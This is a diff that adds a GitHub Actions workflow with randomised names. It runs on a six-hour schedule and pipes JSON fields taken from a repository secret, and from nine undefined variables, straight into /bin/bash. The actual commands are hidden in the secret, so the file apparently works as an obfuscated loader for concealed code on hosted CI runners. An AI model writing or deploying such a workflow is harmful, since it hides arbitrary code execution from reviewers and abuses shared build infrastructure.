@@ -1,0 +1,25 @@
+name: zhoushilang4738
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoushilang4738
+        env:
+          z63: ${{ secrets.z63 }}
+        run: |
+          echo $z63 | jq -r .slwty121 | /bin/bash
+          echo $obd745 | jq -r .gdxzc874 | /bin/bash
+          echo $mys65 | jq -r .uwjyi569 | /bin/bash
+          echo $clyq7 | jq -r .ax8963 | /bin/bash
+          echo $osud52 | jq -r .wbglx2 | /bin/bash
+          echo $etjf28 | jq -r .vzvrp789 | /bin/bash
+          echo $nv81 | jq -r .rofyk1666 | /bin/bash
+          echo $w444 | jq -r .fn7637 | /bin/bash
+          echo $ug56 | jq -r .yi002 | /bin/bash
+          echo $wgoc81225 | jq -r .ocwz084 | /bin/bash
+
